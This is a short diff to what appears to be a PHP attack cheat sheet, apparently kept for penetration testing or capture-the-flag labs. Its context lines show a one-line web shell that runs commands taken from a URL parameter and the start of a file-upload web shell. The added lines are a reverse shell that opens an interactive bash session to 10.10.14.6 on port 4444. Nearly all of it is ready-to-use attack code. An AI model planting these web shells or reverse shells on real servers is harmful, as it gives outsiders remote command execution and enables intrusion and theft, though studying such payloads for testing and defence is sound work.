@@ -4,6 +4,10 @@ bash:# php -a
 # Basic Web Shell
 <?php echo(system($_GET["cmd"])); ?>
 
+# Basic reverse shell_exec
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'");
+?>
 
 # File Upload Web shell with command execution.
 $phpCode = <<<'EOD'
